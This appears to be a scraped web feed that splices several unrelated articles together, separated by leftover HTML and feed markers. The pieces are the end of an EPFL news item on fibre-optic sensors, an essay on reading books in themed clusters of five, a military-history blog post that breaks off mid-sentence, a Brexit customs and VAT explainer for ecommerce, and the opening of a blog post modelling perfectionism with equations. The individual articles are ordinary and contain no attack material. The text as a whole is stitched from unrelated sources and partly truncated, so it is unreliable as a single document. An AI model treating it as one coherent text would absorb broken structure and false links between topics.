optimization algorithms to cope with imperfections. “Other systems are either limited in scope or expensive,” says Thévenaz. “But with ours, you just have to add a software program to your existing equipment. No need to adapt your sensors or use complex devices.”</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Factu.epfl.ch%2Fnews%2Fnew-fiber-optic-sensors-transmit-data-up-to-100-ti%2F&amp;t=NzNiNGFiYWRkOTNhMzJjOGU0Nzc4OGJmMzY0N2ExNmQwOWU5ZmQzOSx6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605558027">École polytechnique fédérale de Lausanne (EPFL)</a></b></p><p><b>Full study:</b>&nbsp;“Genetic-optimised aperiodic code for distributed optical fibre sensors”, <i>Nature Communications</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1038%2Fs41467-020-19201-1&amp;t=YzUxNjE1ZWJiMzA4OGE0MDhjZDEzMWM2N2FlMDQwMzBiZDU5ZGQ5Nix6YW5YWDQyOA%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F634716239692955648%2Fnew-fiber-optics-100x-faster&amp;m=0&amp;ts=1605558027">https://doi.org/10.1038/s41467-020-19201-1</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/627187404240027648/world-record-internet-speed-record-set-by-ucl-scientists">New world record internet speed set</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I try to read a lot, though I'm not nearly as voracious a reader as people who have a reputation for it. I have no idea how Marc Andreessen or Patrick Collison read as much as they do, especially given the enormous demands on their time. The most plausible explanation is that they're aliens with ungodly information processing abilities. I'm human, so I shoot for 40 pages every day, and fail maybe a third of the time. That works out to about 10,000 pages or ~20 books every year. </p><p>Reading twenty books a year gets you a lot. Consider: one book gives you more knowledge about a subject than almost every other person on the planet, because people don't read. Two books on the same subject give you more knowledge than almost any reader, because people don't read two books about the same thing. How many people who read The Power Broker went on to read a second book about Robert Moses? I'd wager not many.</p><p>Beyond two books on a subject, there is a long utility dip. People who bothered to read more than two books about Robert Moses, are either obsessed with him or study him for a living, which means they've read much, much more about him. So two books on a subject, at least with respect to competitive edge, is an inflection point. After you read two, you get diminishing returns.</p><p>There is a way to get around this limitation. A single book is a pinhole view of the world set up by the author. You have no input into its contents, and therefore cannot change the orientation of this view. But you do choose the books you select. That means you can stitch together multiple pinhole views into a unique lens to examine the world— one that no one else will have unless they use the same list of books to stitch together the same lens. </p><p>For example, you can look at the world through history of technology that became ubiquitous. Here is one possible list of books to stitch together this lens: <a href="https://amzn.to/36fB6Vb">The Victorian Internet</a>, <a href="https://amzn.to/2GHE8Jh">Empires of Light</a>, <a href="https://amzn.to/2Ua2P49">The Wright Brothers</a>, <a href="https://amzn.to/38pdoIY">The Network</a>, <a href="https://amzn.to/3n3SeEf">Hackers</a>. Very few people in the world read all five of these books. Even within Silicon Valley, where everyone's living depends on creating new ubiquitous technology, your understanding of how technology becomes ubiquitous will be in the 95th percentile (and likely higher) if you read these five. You will now be armed with a unique instrument that few others possess, and assuming twenty books per year, it only took you three months to acquire.</p><p>Another example is to look at American history and the dynamics of failure by studying biographies of U.S. presidents who sought reelection and lost. There were ten: John Adams, John Quincy Adams, Martin Van Buren, Benjamin Harrison, William H. Taft, Herbert Hoover, Gerald Ford, Jimmy Carter, George H.W. Bush, and now Donald J. Trump. It may be difficult to stomach ten presidential biographies in a row, but it's doable to read five. That's enough to pick up a new lens. Another three months; another sophisticated instrument to examine the world at your disposal.</p><p>I settled on clusters of five and almost never read a single book in isolation. Less than five feel lacking; more than five gets repetitive. Every cluster has a goal of the form "study <code>X</code> through <code>Y</code>". Study American history through technological expansion, or study failure through one term presidents are just a few examples. I try to be creative and make <code>Y</code> unusual. For instance, everyone likes to read about presidents who are believed to be successful. A simple trick is to inverse it and read about unsuccessful ones instead. Or skip the presidents altogether, and read about vice presidents. It doesn't matter what <code>Y</code> is because you're trying to study <code>X</code>, and it's more fun to make <code>Y</code> unusual.</p><p>I don't bother diversifying books within a cluster by time period, cultural or linguistic background of the author, or anything like that. I simply try and find the best books on the subject. Sometimes they turn out to be diverse along some axes; other times they're homogenous. I never read forewords or prefaces and always finish every book in a cluster. I prefer paper to digital, and used books to new ones. I never take notes or, god forbid, create flashcards. My goal is to suck the juice out of a book, not to hold on to pieces of the carcass. If I ever need to remember a specific detail, it's always waiting for me on the shelf.</p><p>This system gives me four new instruments per year, each capable of inspecting the world in a different way. Rather than pick the instruments at random I try to be strategic and collect them into a mental lab. I visualize the lab as a room with multiple stations. Each station has a collection of related instruments on it. When I'm faced with a problem I can go to the right station and examine the problem through the instruments available on that station. All this is physically materialized on my bookshelf. Some day when I become less mobile, I plan to dedicate a literal room to it.</p><p>I don't maintain lists of books I want to read, and don't plan a sequence of instruments to acquire in advance. Once I'm done reading a cluster of books, I ask myself: <em>what instrument can I add to double the utility of my lab</em>? Another way to phrase this question is "what is the most important subject that I know the least about?" It's easy to think of many possible answers to this question; I then pick the answer that seems the most interesting, construct a new cluster of five books, and recurse.</p><p>Four instruments per year may not seem like much, but consider: in five years you will have about twenty mental instruments, all of which interrelate and reinforce each other. In ten years you will have an impressive lab of forty instruments. And it will be unique— no other mental lab on the planet will be able to inspect the world in the way that yours can.</p><p>Because the instruments are constructed from books, they are endlessly upgradeable. Sometimes you might choose to upgrade an existing instrument to increase its power and get higher resolution, rather than acquire a new one. You can do that one book at a time. To use the examples above, you can read another book about ubiquitous technology, or another book about a one term president.</p><p>If you organize your reading this way, your bookshelf won't be arranged by genre like a typical bookstore. Rather than having sections for e.g. biographies, essays, novels, military history, all sorted by author, you will instead have sections for addressing different problems, likely sorted by clusters of books in order that you encountered them. The arrangement won't make sense to anyone except you. But you'll be able to find what you need instantaneously, and your capacity to examine the world from different perspectives will dramatically increase.</p><p>Waiting five, ten, fifteen years to build a mental lab may seem like an impossibly long time. But you don’t have to wait. It’s a pleasure to read about the Wright brothers, or proliferation of the telegraph, or early computer culture! And in a measly three months you’ll have acquired a fresh way of looking at the world. Already you will be a different person. Then you keep going, and keep looking for new instruments to double the utility of existing ones. And in one year? You will look back at today’s version of yourself and find it unrecognizable.</p><p><strong>TL;DR:</strong> Read ~40 pages/day, assume 30% failure rate. That's 10k pages and ~20 books annually. Pick a problem, and read clusters of five books to study that problem from a unique perspective. Visualize each cluster as an instrument to inspect the world. Collect instruments into a mental lab, with various stations for related instruments. You can upgrade the instruments one book at a time. Have your bookshelf reflect this mental image. Win the decade, not the day. Start now and never stop.</p></div></div>]]>

<p>This week, I want to talk about the discipline of military history: what it is, why it is important and how I see my own place within it.  This is going to be a bit of an unusual collections post as it is less about the past itself and more about how we study the past; it is also going to be a bit unusual in that it is mostly my own personal reflections, rather than a historical argument.</p>



<p>We do quite a lot of different kinds of history here on the blog.  There is a fair bit of<a href="https://acoup.blog/2019/09/07/new-acquisitions-class-status-and-the-early-church/"> social history,</a> some <a href="https://acoup.blog/2019/12/05/collections-a-trip-through-thucydides-fear-honor-and-interest/">intellectual </a><a href="https://acoup.blog/2019/12/12/collections-a-trip-through-cicero-natural-law/">history</a>, just a<a href="https://acoup.blog/2019/05/20/new-acquisitions-elective-monarchy-and-the-future-of-westeros/"> little bit of political history</a> and an absolute <a href="https://acoup.blog/tag/organic-economy/"><em>ton</em> of economic history</a>.  Obviously, I think all of those analytical lenses (and several I have not done, of course) are very important ways of understanding the past.  But a lot of what we discuss on the blog fits, narrowly or broadly, into the realm of <strong>military history</strong>.  And I want to talk about that.</p>



<p><strong>Now I should note that I do not consider myself purely a military historian</strong> – indeed, in my experience, few historians are ‘pure’ anything and if you narrow down their specialization enough, you simply end up with, “I am a historian of things which interest me” followed by a long list of what those are.  <strong>I see myself as both an economic and military historian (of the Mediterranean world, broadly construed)</strong> and my research tends to exist in the places where those two strands meet.  Sometimes that means processes that read as non-military (if it isn’t evident I have active research projects on farming and metal production, you haven’t been here long!) and sometimes those projects are more narrowly military.  <strong>I am a firm believer that a historian must be prepared to use whatever tools are going to provide the best answers to their research questions</strong>; for my own work, that has included (basic) statistical analysis, textual close reading, economic theory, archaeology (both traditional and experimental), social history, and even some chemistry and physics.  Whatever works!  But certainly, the methods of military history are one tool in my toolbox, even when I am looking to answer questions about non-military aspects of Mediterranean antiquity.</p>



<p><strong>It is no real secret that as a discipline, military history is sometimes held in low regard by other historians</strong>.  There are a number of reasons for this.  Often it has to do with outdated views on what military history <em>is</em> and what military historians <em>do</em>.  Frequently military history, because it has a large enthusiast and amateur audience, is regarded as an amateur field (something which is not helped by publishers who push quite out reams of quite frankly substandard works of this sort) lacking in sophistication, which is not accurate, but often believed.  And perhaps most often, in my experience, <strong>these opinions serve as cover for a deeper conviction that studying militaries and warfare is icky and only done by people who <em>like</em> war</strong> (when I was a student, this opinion when it was expressed by a certain generation of scholars, now mostly retired, came with a <em>very</em> predictable dose of Vietnam-era anti-military sentiment).  Often it seems the study of military history is neglected by other historians precisely because they find the subject matter uncomfortable.</p>



<p>So I want to talk about three major things here: what military history actually is and how it is done these days, why we should study military history and finally what my experience of being a military historian (both as a scholar and a teacher) has been, particularly given that I am a life-long civilian.  </p>

<h2>What is Military History?</h2>



<p>The popular conception of military history – indeed, the conception sometimes shared even by other historians – is that it is fundamentally a field about charting the course of armies, describing ‘great battles’ and praising the ‘strategic genius’ of this or that ‘great general.’  One of the more obvious examples of this assumption – and the contempt it brings – comes out of the popular CrashCourse youtube series.  When asked by their audience to cover military history related to their coverage of <em>the American Civil War</em>, the response was <a href="https://youtu.be/25HHVDOaGeE">this video listing battles </a>and reflecting on the pointless of the exercise, as if a list of battles was all that military history was (the same series would later say that military historians <a href="https://youtu.be/rlx6ur_D51s?t=323">don’t talk about about food</a>, a truly baffling statement given the important of logistics studies to the field; certainly in my own subfield, military historians tend to talk about food more than any other kind of historian except for dedicated food historians).</p>



<p>The term for works of history in this narrow mold – all battles, campaigns and generals – is <strong>“drums and trumpets” history, a term generally used derisively</strong>.  The study of battles and campaigns emerged initially as a form of training for literate aristocrats preparing to be officers and generals; it is little surprise that they focused on aristocratic leadership as the primary cause for success or failure.  Consequently, the old ‘drums and trumpets’ histories also had a tendency to<a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/"> glory in war </a>and to glorify commanders for their ‘genius’ although this was by no means universal and works of history on conflict as far back as Thucydides and Herodotus (which is to say, as far back as there have been any) have reflected on the destructiveness and tragedy of war.  But military history, like any field, matured over time; I should note that it is <a href="https://acoup.blog/2020/02/07/collections-the-fremen-mirage-part-iiia-by-the-princess-irulan/">hardly the only field of history to have less respectable roots</a> in <a href="https://acoup.blog/2020/02/14/collections-the-fremen-mirage-part-iiib-myths-of-the-atreides/">its quite recent past</a>.  Nevertheless, as the field matured and moved beyond military aristocrats working to emulate older, more successful military aristocrats into a field of scholarly inquiry (still often motivated by the very real concern that officers and political leaders be prepared to lead in the event of conflict) the field has become far more sophisticated and its gaze has broadened to include not merely non-aristocratic soldiers, but non-soldiers more generally.</p>



<p>Instead of the ‘great generals’ orientation of ‘drums and trumpets,’ the field has moved in the direction of three major analytical lenses, laid out quite ably by Jeremy Black in “Military Organisations and Military Charge in Historical Perspective” (<em>JMH</em>, 1998). <strong> He sets out the three basic lenses as technological, social and organizational, which speak to both the questions being asked of the historical evidence but also the answers that are likely to be provided</strong>.  I should note that these lenses are mostly (though not entirely) about <em>academic</em> military history; much of the amateur work that is done is still very much ‘drums and trumpets’ (as is the occasional <em>deeply frustrating</em> books from some older historians we need not discuss here), although that is of course not to say that there isn’t good military history being written by amateurs or that all good military history narrowly follows these schools.  <strong>This is a classification system, not a straight-jacket and I am giving it here because it is a useful way to present the complexity and sophistication of the field as it is, rather than how it is imagined by those who do not engage with it.</strong></p>



<p>(I should note that <em>campaign studies</em> have not been entirely abandoned either.  What distinguishes the modern campaign or battle study from the old ‘drums and trumpets’ style is a broader use of historical causality that reaches beyond just upper-level command decisions. <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/"> Our recent recommendation, <em>Shattered Sword</em></a> is a good example of how what might have been a ‘drums and trumpets’ narrative of admirals and captains can instead be developed, using more sophisticated historical methods, into a much more complete and compelling historical argument about organizations, doctrines, technologies and so on.  And of course campaign histories will never go out of style – they are the essential foundation on which all other kinds of analysis must be laid)</p>



<p><strong>The technological approach is perhaps the least in fashion these days</strong>, but Geoffery Parker’s <em>The Military Revolution</em> (2nd ed. 1996) provides an almost pure example of the lens.  This approach tends to see changing technology – not merely military technologies, but often also civilian technologies – as the main motivator of military change (and also success or failure for states caught in conflict against a technological gradient).  <strong>Consequently, historians with this focus are often asking questions about how technologies developed, why the developed in certain places, and what their impacts were</strong>.  Another good example of the field, for instance, is the debate about the impact of <a href="https://www.amazon.com/gp/product/0700623833/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1">rifled muskets</a> in the <a href="https://www.amazon.com/gp/product/171985727X/ref=ppx_yo_dt_b_asin_title_o07_s00?ie=UTF8&amp;psc=1">American Civil War</a>.  While there has been a real drift away from seeing technologies themselves as decisive on their own (and thus a drift away from mostly ‘pure’ technological military history) in recent decades, this sort of history is very often paired with the others, looking at the ways that social structures, organizational structures and technologies interact.</p>



<p><strong>Perhaps the <em>most</em> popular lens for military historians these days is the social one</strong>, which used to go by the “new military history” (<em>decades </em>ago – it was the standard form even back in the 1990s) but <strong>by this point comprises probably the bulk of academic work on military history</strong>.  In its narrow sense, the social perspective of military history seeks to understand the army (or navy or other service branch) as an extension of the society that created it.  We have, you may note,<a href="https://acoup.blog/2020/05/22/collections-the-battle-of-helms-deep-part-iv-men-of-rohan/"> done a bit of that here</a>.  Rather than understanding the army as a pure instrument of a general’s ‘genius’ it imagines it as a <em><strong>socially embedded</strong></em> institution – which is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Brexit and the implications for ecommerce. Brexit is on agendas across the country and the main cause for concern is the ongoing uncertainty surrounding it, for whilst uncertainty remains, it’s hard to plan ahead. Still, everyone wants to know: how will Brexit impact UK trade?</p><p>For the UK ecommerce and logistics market, the focus is on the movement of goods to EU countries. Here we collate some of the potential implications of different Brexit scenarios including information on importing, exporting, VAT, customs and duties, and how processes may change when we leave the EU.</p><p>Although no one can currently be sure what kind of Brexit the UK will get, it is worth keeping these variables and implications in mind. None of this should be taken as legal advice but, as Brexit talks progress, it may be wise to start assessing how they may impact your business and if your partners and suppliers have started thinking about them too.</p><h2>Implications of Brexit in a no-deal scenario</h2><h3>High-level implications for the UK in a no-deal scenario:</h3><p>The UK becomes a third country whose relations with the EU would be governed by general international public law, including rules of the World Trade Organisation (WTO). The WTO deals with the global rules of trade between nations. Its main function is to ensure that trade flows as smoothly, predictably and freely as possible.</p><p>The European Union must apply its regulation and tariffs at borders with the UK as a third country, including checks and controls for customs, sanitary and phytosanitary standards (to protect humans, animals, and plants from diseases, pests, or contaminants that may enter an EU state), and verification of compliance with EU norms.</p><p>Transport between the UK and the EU would be impacted and sanitary and phytosanitary controls at borders could cause significant customs delays through difficulties at ports and longer road transport times.</p><p>Depending on the circumstances leading to withdrawal without an agreement, the EU may wish to enter into negotiations with the UK as a third country.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122,h_740/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122,h_740/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg" alt="Brexit Implications for ecommerce" width="1122" height="740" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg 1122w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-980x646.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-480x317.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1122px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg 1122w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-980x646.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-480x317.jpeg 480w"></p><h3>Implications for UK businesses:</h3><p>If the UK leaves the EU without a deal we will become a third country, with no preferential deal for customs purposes or for VAT. Duties and taxes will be payable on all goods and shipping times may vary depending on customs clearance.</p><p>Licenses and approvals issued by the UK will no longer be recognised by the EU.</p><p>Companies based in the UK&nbsp;can no longer operate in the EU as a member state and need to establish a representative in an EU country.</p><p>The UK stops being part of EU systems. Access to these systems would need to be renegotiated as a third country.</p><p>Printed matter including catalogues and direct mail may be impacted. If airports and ports are open there should be no change to how this mail is distributed, via post, to the EU. However, if goods traffic is held at ports, tunnels and airports, then mail could also be held up with it.</p><p>UK companies will have to change the way they manage data transfers, such as consumer data for shipping-labels if the data originates from businesses within the EU. Further information can be found on the <a href="https://ico.org.uk/for-organisations/data-protection-and-brexit/" target="_blank" rel="noopener noreferrer">ICO website</a>.</p><h2>What customs arrangements do we currently get as part of the EU?</h2><p>The current customs arrangements allow businesses to move goods freely between EU member states. For customs, this means that businesses trading with the rest of the EU do not have to make any customs import or export declarations. Trade with the EU is not subject to import duty.</p><p>Certain goods are subject to excise duty. These goods are currently free to move between the UK and the rest of the EU with excise duty suspended. The three categories of excise goods that can be held in an excise warehouse in duty-suspension are:</p><ol><li>Alcohol products&nbsp;including&nbsp;beers,&nbsp;wines&nbsp;and spirits.</li><li>Tobacco products&nbsp;including&nbsp;cigarettes, cigars and loose&nbsp;tobacco.</li><li>Energy products&nbsp;including&nbsp;hydrocarbon oils&nbsp;and biofuels for use as&nbsp;motor or&nbsp;heating fuel.</li></ol><p>The government has negotiated to remain in the Common Transit Convention after Brexit to facilitate cross-border movements of goods between contracting parties to the Convention. This will reduce admin activity required by traders. For example, any payment charges due on goods will only be required in their destination country. This should partially mitigate some consequences for the travel of non-EU goods within the EU in the event of a no-deal Brexit.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121,h_738/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121,h_738/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg" alt="Brexit Implications for ecommerce" width="1121" height="738" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg 1121w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-480x316.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1121px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg 1121w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-480x316.jpeg 480w"></p><h2>What are the current VAT and duties arrangements for goods travelling to the EU?</h2><p>VAT is payable by businesses when they bring goods into the UK.

Import and export declarations will also be required.</p><h3>Carrier declarations</h3><p>Carrier declarations will be required for the safety and security of goods.</p><h3>Excise goods</h3><p>The Excise Movement Control System (EMCS) would no longer be used to control suspended movements between the EU and the UK, so the aforementioned excise goods would no longer enjoy duty-suspended movement.</p><h3>Importation for EU</h3><p>Goods entering the UK from the EU will require import declarations. Customs checks may be carried out and any customs duties must be paid.</p><p>Companies must register for a UK Economic Operator Registration and Identification (EORI) number to be used on customs declarations by freight forwarders and couriers and accurate classification on imported material will be needed.</p><p>Arrangements will need to be made with Brokerage and Freight Forwarding companies to get goods to the point of final distribution.</p><h3>Exporting from the UK</h3><p>Businesses must register for a UK EORI number to export, and contracts and International Terms and Conditions of Service (<a href="https://www.gov.uk/guidance/international-trade-paperwork-the-basics" target="_blank" rel="noopener noreferrer">INCOTERMS</a>) must be amended to reflect that your business is now an exporter.</p><p>Export declarations and safety and security declarations will be required.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119,h_736/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119,h_736/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg" alt="Brexit Implications for ecommerce" width="1119" height="736" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg 1119w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-480x316.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1119px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg 1119w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-480x316.jpeg 480w"></p><h2>What will a no-deal scenario mean for VAT and duties arrangements for goods?</h2><h3>VAT imports</h3><p>Postponed accounting will need to be introduced for import VAT on goods brought into the UK. UK VAT registered businesses importing goods to the UK will be able to account for import VAT on their VAT return, rather than paying import VAT on, or soon after, the time that the goods arrive at the UK border.</p><h3>VAT on goods entering the UK as parcels</h3><p>If the UK leaves the EU without an agreement, then&nbsp;Low-Value Consignment Relief (LVCR)&nbsp;will no longer apply to any parcels arriving in the UK. This aligns the UK with the global direction of travel on&nbsp;LVCR. This means that all goods entering the UK, as parcels sent by overseas businesses, will be liable for VAT.</p><p>Overseas businesses will charge VAT at the point of purchase and will be expected to register with an HM Revenue &amp; Customs (HMRC) digital service and account for the VAT due.</p><h3>VAT on exported goods</h3><p>If the UK leaves the EU without an agreement, VAT registered UK businesses will continue to be able to zero-rate sales of goods to EU businesses but will not be required to complete EU sales lists.</p><p>Current EU rules would mean that EU member states will treat goods entering the EU from the UK in the same way as goods entering from other non-EU countries. Associated import VAT and customs duties would be due when the goods arrive in the EU.</p><h2>What are the implications of the EU accepting a government deal?</h2><p>If a deal, similar to that already constructed by the UK Government, were to be accepted by both Parliament and the EU, there would be a few different implications to consider.</p><p>As of the 30th March 2019, the UK no longer participates in EU decision-making, EU institutions, and governance of EU bodies and agencies.</p><p>The role of EU institutions in the supervision and enforcement of EU law in the UK would continue throughout the transition period.</p><p>The EU would need to negotiate with the UK an agreement on their future relationship, which should ideally be in place (agreed, signed and ratified) at the end of the transition period and apply as from 1st January 2021.</p><p>UK businesses would have some planning time as there would be no immediate impact on customs procedures and the ability to import and export within the EU. There would also be no changes to customs declarations.</p><p>Alternate recommended articles:</p><p>:<a href="https://www.swifterm.com/the-2nd-tier-of-email-marketing/"><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_298,h_198/https://www.swifterm.com/wp-content/uploads/2020/09/2nd-tier-email-solution-1.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_298,h_198/https://www.swifterm.com/wp-content/uploads/2020/09/2nd-tier-email-solution-1.jpeg" alt="2nd-tier-email-solution" width="298" height="198"></a></p></div></div>]]>

					<p>I struggle with perfectionism. Well, not so much “struggle with” — I’m f*cking great at it. It comes naturally.</p>
<p>There are some upsides, but perfectionism is also associated with anxiety, depression, procrastination, and damaged relationships. Perhaps you, like I, have spent far too much time and emotional energy making sure that an email had the right word choice, had no typos, didn’t reuse a phrase in successive sentences/paragraphs, and closed with the ‘correct’ sign-off. (‘Best,’ is almost always optimal, by the way).</p>
<blockquote><p>“If I couldn’t do something that rated 10 out of 10 — or at least close to that — I didn’t want to do it at all. Being a perfectionist was an ongoing source of suffering and unhappiness for me … Unfortunately, many of us have been conditioned to hold ourselves to impossible standards. This is a stressful mind state to live in, that’s for sure.” ~ <a href="https://www.psychologytoday.com/us/blog/turning-straw-gold/201806/how-overcome-your-perfectionist-tendencies" target="_blank" rel="noopener">Tony Bernard J.D.</a></p></blockquote>
<p>The topic of perfectionism confused me for years. Of course you want things to be perfect; why would you ever actively want something to be worse? However, there’s way more to it than that: It’s a complex interplay between effort, time, motivation, and expectations.</p>
<p>Far too many self-help recommendations essentially said “Be ok with mediocrity!” which… did not speak to me, to say the least.</p>
<p>To better understand the concept, I went through a number of books and papers before building a quasi-mathematical model. You know, like ya’do.</p>
<p>I’ve come to see perfectionism as a mindset with a particular calibration between the quality of your work and your emotional reaction — with decreased sensitivity to marginal differences in lower-quality work and increasing sensitivity as the quality goes up.</p>

<ul>
<li><span><strong>In a “Balanced” mindset,</strong> </span>you become happier in linear proportion to how much better your work is going. (y = x)</li>
<li><span><strong>In a “Satisficing” mindset</strong></span> — taking a pass/fail test, for example — you care about whether something is “good enough”. Most of your emotional variance comes as you approach and meet that threshold.&nbsp; ( e^x / (1+e^x) )</li>
<li><span><strong>In a Perfectionist mindset,</strong></span> the relationship between quality and emotion is polynomial. You feel almost equally bad about scoring a 40% on a test vs. a 65%, but the difference between a 90% and 93% looms large. (y = x^7)</li>
</ul>
<p>Looking at the model, I realized it could explain a number of experiences I’d had.</p>
<hr>
<h3>Why even small tasks seem daunting to a perfectionist</h3>
<p>A common experience with a perfectionist mindset is having trouble ‘letting go’ of a project — we want to keep tinkering with it, improving it, and never feel quite comfortable moving on. &nbsp;(I don’t want to say how long this draft sat around.)</p>
<p>This make sense given the model:</p>
<p><img data-attachment-id="2369" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/happyenough/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=1200%2C702&amp;ssl=1" data-orig-size="1200,702" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="HappyEnough" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=630%2C369&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;ssl=1" alt="HappyEnough" width="630" height="369" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>When I think about clicking ‘send’ or ‘post’ before I’ve checked for typos, before I’ve reread everything, before considering where it might be wrong or unclear… it just feels, well, WRONG. I’m not yet happy with it and have trouble declaring it done.</p>
